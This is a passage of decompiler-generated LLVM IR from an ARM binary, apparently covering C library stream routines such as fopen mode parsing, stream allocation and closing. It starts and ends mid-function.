  %v2_144d088 = phi i32 [ %v1_14574, %dec_label_pc_14574.dec_label_pc_14584_crit_edge ], [ %v1_144b4, %dec_label_pc_14584.preheader ]
  %v0_144d087 = phi i32 [ %v0_14578, %dec_label_pc_14574.dec_label_pc_14584_crit_edge ], [ %v0_1457813, %dec_label_pc_14584.preheader ]
  %v2_1458c = load i32, i32* @sb, align 4
  %v3_1458c = sub i32 %v2_144d088, %v2_1458c
  %v5_1458c = xor i32 %v2_1458c, %v2_144d088
  %v6_1458c = xor i32 %v3_1458c, %v2_144d088
  %v7_1458c = and i32 %v6_1458c, %v5_1458c
  %v8_1458c = icmp slt i32 %v7_1458c, 0
  %v9_1458c = icmp slt i32 %v3_1458c, 0
  %v10_1458c = icmp eq i32 %v2_144d088, %v2_1458c
  store i1 %v10_1458c, i1* %cpsr_z.global-to-local, align 1
  %v2_14590 = xor i1 %v9_1458c, %v8_1458c
  br i1 %v2_14590, label %dec_label_pc_144c0, label %dec_label_pc_14594

dec_label_pc_14594:                               ; preds = %dec_label_pc_14584.preheader, %bb74, %dec_label_pc_14574, %dec_label_pc_14574.dec_label_pc_14584_crit_edge, %dec_label_pc_14578.preheader
  %v0_14598 = phi i32 [ %v1_144b4, %dec_label_pc_14578.preheader ], [ %v1_144b4, %dec_label_pc_14584.preheader ], [ %v2_144d088, %bb74 ], [ %v1_14574, %dec_label_pc_14574 ], [ %v1_14574, %dec_label_pc_14574.dec_label_pc_14584_crit_edge ]
  store i32 %v3_142b8, i32* %r2.global-to-local, align 4
  %v9_14598 = icmp eq i32 %v0_14598, %v3_142b8
  store i1 %v9_14598, i1* %cpsr_z.global-to-local, align 1
  %v6_1459c = icmp slt i32 %v0_14598, %v3_142b8
  br i1 %v6_1459c, label %dec_label_pc_145a0, label %dec_label_pc_145ac

dec_label_pc_145a0:                               ; preds = %dec_label_pc_14594
  %v0_145a0 = load i32, i32* @r8, align 4
  %v1_145a0 = and i32 %v0_145a0, 1048576
  %v2_145a0 = icmp eq i32 %v1_145a0, 0
  store i1 %v2_145a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_145a0, label %dec_label_pc_142f8.backedge, label %dec_label_pc_145a8

dec_label_pc_142f8.backedge:                      ; preds = %dec_label_pc_145a0, %dec_label_pc_144a0, %dec_label_pc_144ac
  %v0_142f8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_142f8

dec_label_pc_145a8:                               ; preds = %dec_label_pc_14460, %.thread, %dec_label_pc_145a0, %dec_label_pc_14294
  br label %dec_label_pc_145ac

dec_label_pc_145ac:                               ; preds = %dec_label_pc_14594, %dec_label_pc_1437c, %dec_label_pc_145a8
  %v0_145ac = phi i32 [ %v0_1438c, %dec_label_pc_1437c ], [ 0, %dec_label_pc_145a8 ], [ %v0_14598, %dec_label_pc_14594 ]
  store i32 %v0_145ac, i32* %r0.global-to-local, align 4
  store i32 %v3_14294, i32* @r4, align 4
  store i32 %v6_14294, i32* @r5, align 4
  store i32 %v9_14294, i32* @r6, align 4
  store i32 %v12_14294, i32* @r7, align 4
  store i32 %v15_14294, i32* @r8, align 4
  store i32 %v18_14294, i32* @sb, align 4
  store i32 %v21_14294, i32* @sl, align 4
  store i32 %v24_14294, i32* @fp, align 4
  ret i32 %v0_145ac

; uselistorder directives
  uselistorder i32 %v0_145ac, { 1, 0 }
  uselistorder i32 %v0_14598, { 0, 2, 1 }
  uselistorder i32 %v3_1458c, { 1, 0 }
  uselistorder i32 %v2_1458c, { 1, 0, 2 }
  uselistorder i32 %v2_144d088, { 0, 1, 6, 5, 2, 3, 4 }
  uselistorder i1 %v9_14588, { 1, 0 }
  uselistorder i32 %v0_14578.pre, { 0, 2, 1 }
  uselistorder i32 %v5_1450c, { 1, 0, 2, 3 }
  uselistorder i1 %v9_1458886, { 1, 0 }
  uselistorder i1 %v9_144b0, { 1, 0 }
  uselistorder i32 %v3_14488, { 0, 2, 1, 3 }
  uselistorder i1 %v7_14460, { 1, 0 }
  uselistorder i1 %v8_14458, { 1, 0 }
  uselistorder i32 %v3_14428, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_14418, { 3, 2, 0, 1, 4, 5, 6 }
  uselistorder i32 %v5_14400, { 1, 0, 2 }
  uselistorder i32 %v1_143f0, { 1, 2, 0, 3 }
  uselistorder i32 %v0_143dc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_143d4, { 1, 0 }
  uselistorder i32 %v1_143c0, { 1, 0 }
  uselistorder i32 %v1_143bc, { 1, 0 }
  uselistorder i32 %v1_1437c, { 2, 0, 1 }
  uselistorder i32 %v0_14364, { 1, 0 }
  uselistorder i32 %v1_14354, { 0, 2, 1 }
  uselistorder i1 %v2_14484, { 1, 0, 2, 3 }
  uselistorder i32 %v1_142e0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_142d4, { 2, 1, 0 }
  uselistorder i32 %v3_142bc, { 1, 0 }
  uselistorder i32 %v3_142b8, { 2, 1, 0 }
  uselistorder i32 %v1_142b0, { 2, 0, 1 }
  uselistorder i32* %r3.global-to-local, { 4, 24, 25, 1, 2, 3, 23, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r2.global-to-local, { 13, 3, 14, 15, 16, 1, 2, 12, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r0.global-to-local, { 24, 23, 25, 27, 26, 1, 3, 2, 6, 7, 5, 4, 9, 8, 11, 10, 12, 13, 16, 14, 15, 20, 17, 18, 19, 22, 21, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 26, 27, 3, 4, 5, 28, 29, 30, 31, 32, 33, 0, 1, 2, 25, 24, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 1048576, { 1, 0, 2 }
  uselistorder i32 (i8*, i32)* @function_15904, { 1, 0 }
  uselistorder i32 92, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 (i32)* @function_15840, { 1, 0 }
  uselistorder i32 262144, { 1, 2, 0 }
  uselistorder i32* @sl, { 8, 9, 10, 11, 12, 13, 14, 41, 0, 42, 43, 15, 16, 101, 102, 103, 104, 105, 106, 107, 108, 109, 1, 110, 111, 112, 113, 114, 115, 117, 2, 116, 119, 118, 120, 121, 122, 123, 17, 18, 19, 20, 21, 22, 23, 24, 29, 30, 25, 26, 27, 28, 31, 32, 33, 34, 35, 36, 37, 3, 38, 39, 40, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 6, 88, 89, 90, 7, 91, 92, 93, 94, 95, 96, 97, 4, 98, 99, 100, 124, 5, 125, 126, 127, 55, 56, 57 }
  uselistorder i32 %arg3, { 3, 4, 2, 0, 1, 5, 6 }
  uselistorder label %dec_label_pc_145ac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_145a8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_142f8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14594, { 1, 3, 2, 0, 4 }
  uselistorder label %bb74, { 1, 0 }
  uselistorder label %dec_label_pc_14574, { 1, 0 }
  uselistorder label %bb73, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14528, { 1, 0 }
  uselistorder label %dec_label_pc_144a0, { 1, 0 }
  uselistorder label %dec_label_pc_14460, { 1, 0 }
  uselistorder label %dec_label_pc_14454, { 0, 2, 1 }
  uselistorder label %dec_label_pc_14418, { 1, 0 }
  uselistorder label %dec_label_pc_1434c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb66, { 1, 0 }
}

define i32 @function_145bc(i32* %arg1) local_unnamed_addr {
dec_label_pc_145bc:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v2_145c0 = icmp eq i32* %arg1, null
  br i1 %v2_145c0, label %dec_label_pc_145e8, label %dec_label_pc_145c8

dec_label_pc_145c8:                               ; preds = %dec_label_pc_145bc
  %v2_145c8 = load i32, i32* %arg1, align 4
  %v1_145cc = inttoptr i32 %v2_145c8 to i16*
  %v2_145cc = call i32 @function_14638(i16* %v1_145cc)
  %v0_145d0 = load i32, i32* @r4, align 4
  %v1_145d0 = add i32 %v0_145d0, 20
  %v2_145d0 = inttoptr i32 %v1_145d0 to i32*
  %v3_145d0 = load i32, i32* %v2_145d0, align 4
  %v2_145d4 = icmp eq i32 %v3_145d0, 0
  br i1 %v2_145d4, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_145c8
  br label %bb6

bb6:                                              ; preds = %dec_label_pc_145c8, %bb
  store i32 83424, i32* @lr, align 4
  %v1_145dc = xor i1 %v2_145d4, true
  call void @__pseudo_cond_branch(i1 %v1_145dc, i32 ptrtoint (i32* @global_var_128a8.21 to i32))
  %v0_145e0 = load i32, i32* @r4, align 4
  store i32 %v0_145e0, i32* @r0, align 4
  %v0_145e4 = call i32 @function_128a8()
  br label %dec_label_pc_145e8

dec_label_pc_145e8:                               ; preds = %dec_label_pc_145bc, %bb6
  %v1_145ec = phi i32 [ 0, %dec_label_pc_145bc ], [ %v0_145e4, %bb6 ]
  ret i32 %v1_145ec

; uselistorder directives
  uselistorder i32* null, { 0, 5, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 2, 18, 19, 20, 3, 21, 4, 22 }
  uselistorder label %dec_label_pc_145e8, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
}

define i32 @function_145f0(i32 %arg1) local_unnamed_addr {
dec_label_pc_145f0:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_145fc = load i32, i32* @r4, align 4
  store i32 %v3_145fc, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_16440.501 to i32), i32* @r1, align 4
  %v0_14604 = call i32 @function_147ec()
  store i32 %v0_14604, i32* %r0.global-to-local, align 4
  store i32 %v0_14604, i32* @r4, align 4
  %v2_14608 = icmp eq i32 %v0_14604, 0
  br i1 %v2_14608, label %bb, label %dec_label_pc_14614

bb:                                               ; preds = %dec_label_pc_145f0
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb5

dec_label_pc_14614:                               ; preds = %dec_label_pc_145f0
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_1461c = call i32 @function_1215c(i32 1, i32 24)
  store i32 %v2_1461c, i32* %r0.global-to-local, align 4
  %v2_14620 = icmp eq i32 %v2_1461c, 0
  br i1 %v2_14620, label %bb5, label %bb4

bb4:                                              ; preds = %dec_label_pc_14614
  %v1_14624 = load i32, i32* @r4, align 4
  %v3_14624 = inttoptr i32 %v2_1461c to i32*
  store i32 %v1_14624, i32* %v3_14624, align 4
  %v1_1462c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %bb5

bb5:                                              ; preds = %bb, %dec_label_pc_14614, %bb4
  %v1_1462c = phi i32 [ 0, %bb ], [ 0, %dec_label_pc_14614 ], [ %v1_1462c.pre, %bb4 ]
  %v2_14628 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14628, i32* @r4, align 4
  ret i32 %v1_1462c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @function_1215c, { 33, 2, 40, 36, 35, 34, 15, 14, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 1, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 39, 38, 37 }
  uselistorder label %bb5, { 2, 1, 0 }
}

define i32 @function_14638(i16* %arg1) local_unnamed_addr {
dec_label_pc_14638:
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14638 = load i32, i32* @r4, align 4
  store i32 %v3_14638, i32* %stack_var_-36, align 4
  %v6_14638 = load i32, i32* @r5, align 4
  %v9_14638 = load i32, i32* @r6, align 4
  %v12_14638 = load i32, i32* @r7, align 4
  %v2_1463c = add i32 %tmp, 52
  %v3_1463c = inttoptr i32 %v2_1463c to i32*
  %v4_1463c = load i32, i32* %v3_1463c, align 4
  %v1_14644 = sub i32 1, %v4_1463c
  %v2_14644 = icmp ult i32 %v4_1463c, 2
  br i1 %v2_14644, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_14638
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_14638, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v1_14644, %dec_label_pc_14638 ]
  %v0_1464c = phi i32 [ 0, %bb ], [ %v1_14644, %dec_label_pc_14638 ]
  store i32 %storemerge, i32* %sb.global-to-local, align 4
  %v2_1464c = icmp eq i32 %v0_1464c, 0
  store i32 %tmp, i32* @r5, align 4
  store i32 124820, i32* @r6, align 4
  br i1 %v2_1464c, label %dec_label_pc_14698, label %dec_label_pc_14660

dec_label_pc_14660:                               ; preds = %bb18
  %v4_14678 = load i32, i32* inttoptr (i32 124892 to i32*), align 4
  call void @__pseudo_branch(i32 %v4_14678)
  %v0_1468c = load i32, i32* @r6, align 4
  %v2_1468c = add i32 %v0_1468c, 16
  %v3_1468c = inttoptr i32 %v2_1468c to i32*
  %v4_1468c = load i32, i32* %v3_1468c, align 4
  call void @__pseudo_branch(i32 %v4_1468c)
  %v0_14698.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14698

dec_label_pc_14698:                               ; preds = %bb18, %dec_label_pc_14660
  %v1_146a0 = phi i32 [ %tmp, %bb18 ], [ %v0_14698.pre, %dec_label_pc_14660 ]
  %v1_14698 = inttoptr i32 %v1_146a0 to i16*
  %v2_14698 = load i16, i16* %v1_14698, align 2
  %v3_14698 = zext i16 %v2_14698 to i32
  %v1_1469c = and i32 %v3_14698, 64
  %v2_1469c = icmp eq i32 %v1_1469c, 0
  br i1 %v2_1469c, label %bb20, label %bb19

bb19:                                             ; preds = %dec_label_pc_14698
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_14698, %bb19
  %storemerge26 = phi i32 [ %v1_146a0, %bb19 ], [ %v1_1469c, %dec_label_pc_14698 ]
  %v1_146a4 = xor i1 %v2_1469c, true
  call void @__pseudo_cond_branch(i1 %v1_146a4, i32 ptrtoint (i32* @global_var_14fd4.506 to i32))
  store i32 %storemerge26, i32* %sl.global-to-local, align 4
  %v0_146ac = load i32, i32* @r5, align 4
  %v1_146ac = add i32 %v0_146ac, 4
  %v2_146ac = inttoptr i32 %v1_146ac to i32*
  %v3_146ac = load i32, i32* %v2_146ac, align 4
  %v1_146b0 = call i32 @function_10ddc(i32 %v3_146ac)
  %v0_146b8 = load i32, i32* @r6, align 4
  %v2_146c4 = add i32 %v0_146b8, 108
  %v3_146c4 = inttoptr i32 %v2_146c4 to i32*
  %v4_146c4 = load i32, i32* %v3_146c4, align 4
  store i32 %v4_146c4, i32* @r7, align 4
  %v1_146cc = load i32, i32* @r5, align 4
  %v2_146cc = add i32 %v1_146cc, 4
  %v3_146cc = inttoptr i32 %v2_146cc to i32*
  store i32 -1, i32* %v3_146cc, align 4
  %v0_146d4 = load i32, i32* @r6, align 4
  %v2_146d4 = add i32 %v0_146d4, 72
  %v3_146d4 = inttoptr i32 %v2_146d4 to i32*
  %v4_146d4 = load i32, i32* %v3_146d4, align 4
  %v1_146dc = icmp slt i32 %v1_146b0, 0
  store i32 %v4_146d4, i32* %stack_var_-80, align 4
  br i1 %v1_146dc, label %bb21, label %bb22

bb21:                                             ; preds = %bb20
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb22

bb22:                                             ; preds = %bb20, %bb21
  call void @__pseudo_branch(i32 %v4_146d4)
  %v0_14704 = load i32, i32* @r6, align 4
  %v2_14704 = add i32 %v0_14704, 16
  %v3_14704 = inttoptr i32 %v2_14704 to i32*
  %v4_14704 = load i32, i32* %v3_14704, align 4
  call void @__pseudo_branch(i32 %v4_14704)
  %v0_14714 = load i32, i32* @r6, align 4
  %v2_14714 = add i32 %v0_14714, 12
  %v3_14714 = inttoptr i32 %v2_14714 to i32*
  %v4_14714 = load i32, i32* %v3_14714, align 4
  %v1_14718 = inttoptr i32 %v4_14714 to i32*
  %v2_14718 = load i32, i32* %v1_14718, align 4
  %v1_14720 = add i32 %v2_14718, 1
  %v2_14724 = add i32 %v0_14714, 24
  %v3_14724 = inttoptr i32 %v2_14724 to i32*
  %v4_14724 = load i32, i32* %v3_14724, align 4
  store i32 %v4_14724, i32* @r4, align 4
  store i32 %v1_14720, i32* %v1_14718, align 4
  call void @__pseudo_branch(i32 %v4_14724)
  %v0_1473c = load i32, i32* @r5, align 4
  %v1_1473c = inttoptr i32 %v0_1473c to i16*
  %v2_1473c = load i16, i16* %v1_1473c, align 2
  %v1_14740 = and i16 %v2_1473c, 24576
  %v1_14744 = or i16 %v1_14740, 48
  %v0_14748 = load i32, i32* %sb.global-to-local, align 4
  %v2_14748 = icmp eq i32 %v0_14748, 0
  store i16 %v1_14744, i16* %v1_1473c, align 2
  br i1 %v2_14748, label %.thread, label %bb23

bb23:                                             ; preds = %bb22
  br label %.thread

.thread:                                          ; preds = %bb22, %bb23
  %v2_1475c = xor i1 %v2_14748, true
  call void @__pseudo_cond_branch(i1 %v2_1475c, i32 %v4_14724)
  %v0_14760 = load i32, i32* @r5, align 4
  %v1_14760 = inttoptr i32 %v0_14760 to i16*
  %v2_14760 = load i16, i16* %v1_14760, align 2
  %v1_14764 = and i16 %v2_14760, 16384
  %v2_14764 = icmp eq i16 %v1_14764, 0
  br i1 %v2_14764, label %bb25, label %bb24

bb24:                                             ; preds = %.thread
  br label %bb25

bb25:                                             ; preds = %.thread, %bb24
  %v1_1476c = xor i1 %v2_14764, true
  call void @__pseudo_cond_branch(i1 %v1_1476c, i32 ptrtoint (i32* @global_var_128a8.21 to i32))
  %v2_14778 = load i32, i32* %stack_var_-80, align 4
  call void @__pseudo_branch(i32 %v2_14778)
  call void @__pseudo_branch(i32 %v4_14704)
  %v0_14798 = load i32, i32* @r6, align 4
  %v2_14798 = add i32 %v0_14798, 48
  %v3_14798 = inttoptr i32 %v2_14798 to i32*
  %v4_14798 = load i32, i32* %v3_14798, align 4
  %v1_1479c = inttoptr i32 %v4_14798 to i32*
  %v2_1479c = load i32, i32* %v1_1479c, align 4
  %v1_147a0 = add i32 %v2_1479c, 1
  store i32 %v1_147a0, i32* %v1_1479c, align 4
  call void @__pseudo_branch(i32 %v4_14724)
  %v0_147b8 = call i32 @function_14e4c()
  %v0_147bc = load i32, i32* %sl.global-to-local, align 4
  %v2_147c4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_147c4, i32* @r4, align 4
  store i32 %v6_14638, i32* @r5, align 4
  store i32 %v9_14638, i32* @r6, align 4
  store i32 %v12_14638, i32* @r7, align 4
  ret i32 %v0_147bc

; uselistorder directives
  uselistorder i1 %v2_14764, { 1, 0 }
  uselistorder i32 %v4_14724, { 0, 2, 1, 3 }
  uselistorder i32 %v4_1463c, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %sb.global-to-local, { 1, 0 }
  uselistorder i32 (i32)* @function_10ddc, { 9, 29, 28, 27, 32, 26, 31, 30, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb22, { 1, 0 }
  uselistorder label %bb20, { 1, 0 }
  uselistorder label %dec_label_pc_14698, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
}

define i32 @function_147d0(i32 %arg1) local_unnamed_addr {
dec_label_pc_147d0:
  %v0_147d0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_147d0, label %bb, label %.thread5

bb:                                               ; preds = %dec_label_pc_147d0
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_147d0, %bb
  %v10_147e8 = phi i32 [ %arg1, %dec_label_pc_147d0 ], [ 0, %bb ]
  ret i32 %v10_147e8

; uselistorder directives
  uselistorder label %.thread5, { 1, 0 }
}

define i32 @function_147ec() local_unnamed_addr {
dec_label_pc_147ec:
  store i32 0, i32* @r2, align 4
  store i32 -1, i32* @r3, align 4
  %v0_147fc = call i32 @function_1480c()
  ret i32 %v0_147fc
}

define i32 @function_1480c() local_unnamed_addr {
dec_label_pc_1480c:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1480c = load i32, i32* @r4, align 4
  store i32 %v3_1480c, i32* %stack_var_-36, align 4
  %v6_1480c = load i32, i32* @r5, align 4
  %v9_1480c = load i32, i32* @r6, align 4
  %v18_1480c = load i32, i32* @sb, align 4
  %v24_1480c = load i32, i32* @fp, align 4
  %v0_14810 = load i32, i32* @r1, align 4
  %v1_14810 = inttoptr i32 %v0_14810 to i8*
  %v2_14810 = load i8, i8* %v1_14810, align 1
  %v3_14810 = zext i8 %v2_14810 to i32
  store i32 %v3_14810, i32* @ip, align 4
  %v7_14818 = icmp eq i8 %v2_14810, 114
  store i32 124820, i32* @fp, align 4
  %v2_14820 = ptrtoint i32* %stack_var_-72 to i32
  %v0_14824 = load i32, i32* @r0, align 4
  store i32 %v0_14824, i32* @r6, align 4
  %v0_14828 = load i32, i32* @r2, align 4
  store i32 %v0_14828, i32* @sb, align 4
  %v0_1482c = load i32, i32* @r3, align 4
  store i32 %v0_1482c, i32* @r5, align 4
  br i1 %v7_14818, label %dec_label_pc_14878, label %dec_label_pc_14834

dec_label_pc_14834:                               ; preds = %dec_label_pc_1480c
  %v7_14834 = icmp eq i8 %v2_14810, 119
  br i1 %v7_14834, label %bb, label %dec_label_pc_14840

bb:                                               ; preds = %dec_label_pc_14834
  store i32 577, i32* @r4, align 4
  br label %dec_label_pc_1487c

dec_label_pc_14840:                               ; preds = %dec_label_pc_14834
  %v7_14840 = icmp eq i8 %v2_14810, 97
  br i1 %v7_14840, label %bb32, label %dec_label_pc_1484c

bb32:                                             ; preds = %dec_label_pc_14840
  store i32 1089, i32* @r4, align 4
  br label %dec_label_pc_1487c

dec_label_pc_1484c:                               ; preds = %dec_label_pc_14840, %dec_label_pc_14900, %dec_label_pc_148d4
  %v0_1484c = call i32 @function_11204()
  store i32 %v0_1484c, i32* %r0.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v0_14854 = load i32, i32* @sb, align 4
  %v2_14854 = icmp eq i32 %v0_14854, 0
  %v2_14858 = inttoptr i32 %v0_1484c to i32*
  store i32 22, i32* %v2_14858, align 4
  br i1 %v2_14854, label %dec_label_pc_14acc, label %dec_label_pc_14860

dec_label_pc_14860:                               ; preds = %dec_label_pc_14924._crit_edge, %dec_label_pc_1484c
  %v0_14860 = load i32, i32* @sb, align 4
  %v1_14860 = inttoptr i32 %v0_14860 to i16*
  %v2_14860 = load i16, i16* %v1_14860, align 2
  %v3_14860 = zext i16 %v2_14860 to i32
  store i32 %v3_14860, i32* %r3.global-to-local, align 4
  %v1_14864 = and i32 %v3_14860, 8192
  %v2_14864 = icmp eq i32 %v1_14864, 0
  br i1 %v2_14864, label %dec_label_pc_14acc, label %dec_label_pc_1486c

dec_label_pc_1486c:                               ; preds = %dec_label_pc_14860
  store i32 %v0_14860, i32* @r0, align 4
  %v0_14870 = call i32 @function_128a8()
  store i32 %v0_14870, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14acc

dec_label_pc_14878:                               ; preds = %dec_label_pc_1480c
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1487c

dec_label_pc_1487c:                               ; preds = %bb, %bb32, %dec_label_pc_14878
  %v1_14894 = phi i32 [ 1089, %bb32 ], [ 577, %bb ], [ 1, %dec_label_pc_14878 ]
  %v1_1487c = add i32 %v0_14810, 1
  %v2_1487c = inttoptr i32 %v1_1487c to i8*
  %v3_1487c = load i8, i8* %v2_1487c, align 1
  %v7_14880 = icmp eq i8 %v3_1487c, 98
  %v1_1487c.v0_14810 = select i1 %v7_14880, i32 %v1_1487c, i32 %v0_14810
  store i32 %v1_1487c.v0_14810, i32* %r3.global-to-local, align 4
  %v1_1488c = add i32 %v1_1487c.v0_14810, 1
  %v2_1488c = inttoptr i32 %v1_1488c to i8*
  %v3_1488c = load i8, i8* %v2_1488c, align 1
  %v4_1488c = zext i8 %v3_1488c to i32
  store i32 %v4_1488c, i32* @r3, align 4
  %v7_14890 = icmp eq i8 %v3_1488c, 43
  br i1 %v7_14890, label %bb35, label %.thread3

bb35:                                             ; preds = %dec_label_pc_1487c
  store i32 %v1_14894, i32* @r3, align 4
  %v2_14898 = add nuw nsw i32 %v1_14894, 1
  store i32 %v2_14898, i32* @r4, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_1487c, %bb35
  %v2_1489c = icmp eq i32 %v0_14828, 0
  br i1 %v2_1489c, label %dec_label_pc_148a4, label %dec_label_pc_148cc

dec_label_pc_148a4:                               ; preds = %.thread3
  store i32 80, i32* @r0, align 4
  %v0_148a8 = call i32 @function_1183c()
  store i32 %v0_148a8, i32* %r0.global-to-local, align 4
  store i32 %v0_148a8, i32* @sb, align 4
  %v3_148ac = icmp eq i32 %v0_148a8, 0
  br i1 %v3_148ac, label %dec_label_pc_14ad0, label %dec_label_pc_148b4

dec_label_pc_148b4:                               ; preds = %dec_label_pc_148a4
  %v2_148b8 = add i32 %v0_148a8, 8
  %v3_148b8 = inttoptr i32 %v2_148b8 to i32*
  store i32 0, i32* %v3_148b8, align 4
  store i32 8192, i32* %r3.global-to-local, align 4
  %v2_148c0 = load i32, i32* @sb, align 4
  %v3_148c0 = inttoptr i32 %v2_148c0 to i16*
  store i16 8192, i16* %v3_148c0, align 2
  %v0_148c4 = load i32, i32* @sb, align 4
  %v1_148c4 = add i32 %v0_148c4, 56
  store i32 %v1_148c4, i32* @r0, align 4
  %v1_148c8 = call i32 @function_14b7c(i32 %v1_148c4)
  store i32 %v1_148c8, i32* %r0.global-to-local, align 4
  %v0_148cc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_148cc

dec_label_pc_148cc:                               ; preds = %.thread3, %dec_label_pc_148b4
  %v0_14924 = phi i32 [ %v0_1482c, %.thread3 ], [ %v0_148cc.pre, %dec_label_pc_148b4 ]
  %v1_148cc = icmp slt i32 %v0_14924, 0
  br i1 %v1_148cc, label %dec_label_pc_14924, label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %dec_label_pc_148cc
  %v0_148d8 = load i32, i32* @r4, align 4
  %v2_148d8 = and i32 %v0_148d8, ptrtoint (i32* @global_var_20003.515 to i32)
  %v1_148dc = or i32 %v2_148d8, 1
  store i32 %v1_148dc, i32* %r2.global-to-local, align 4
  %v0_148e0 = load i32, i32* @r6, align 4
  %v1_148e0 = add i32 %v0_148e0, 1
  %v2_148e4 = and i32 %v1_148e0, %v1_148dc
  store i32 %v2_148e4, i32* %r3.global-to-local, align 4
  %v9_148e8 = icmp eq i32 %v2_148e4, %v1_148dc
  %v1_148ec = load i32, i32* @sb, align 4
  %v2_148ec = add i32 %v1_148ec, 4
  %v3_148ec = inttoptr i32 %v2_148ec to i32*
  store i32 %v0_14924, i32* %v3_148ec, align 4
  br i1 %v9_148e8, label %dec_label_pc_148f4, label %dec_label_pc_1484c

dec_label_pc_148f4:                               ; preds = %dec_label_pc_148d4
  %v0_148f4 = load i32, i32* @r4, align 4
  %v1_148f4 = load i32, i32* @r6, align 4
  %v2_148f4 = sub i32 -1, %v1_148f4
  %v3_148f4 = and i32 %v0_148f4, %v2_148f4
  store i32 %v3_148f4, i32* @r3, align 4
  %v1_148f8 = and i32 %v3_148f4, 1024
  %v2_148f8 = icmp eq i32 %v1_148f8, 0
  br i1 %v2_148f8, label %dec_label_pc_14918, label %dec_label_pc_14900

dec_label_pc_14900:                               ; preds = %dec_label_pc_148f4
  %v0_14900 = load i32, i32* @r5, align 4
  store i32 %v0_14900, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_1490c = call i32 @function_10c10(i32 %v0_14900, i32 4)
  store i32 %v2_1490c, i32* %r0.global-to-local, align 4
  %v2_14910 = icmp eq i32 %v2_1490c, 0
  br i1 %v2_14910, label %dec_label_pc_14900.dec_label_pc_14918_crit_edge, label %dec_label_pc_1484c

dec_label_pc_14900.dec_label_pc_14918_crit_edge:  ; preds = %dec_label_pc_14900
  %v0_14918.pre = load i32, i32* @r6, align 4
  %v0_1491c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14918

dec_label_pc_14918:                               ; preds = %dec_label_pc_14900.dec_label_pc_14918_crit_edge, %dec_label_pc_148f4
  %v0_1491c = phi i32 [ %v0_1491c.pre, %dec_label_pc_14900.dec_label_pc_14918_crit_edge ], [ %v0_148f4, %dec_label_pc_148f4 ]
  %v0_14918 = phi i32 [ %v0_14918.pre, %dec_label_pc_14900.dec_label_pc_14918_crit_edge ], [ %v1_148f4, %dec_label_pc_148f4 ]
  %v1_14918 = and i32 %v0_14918, 131072
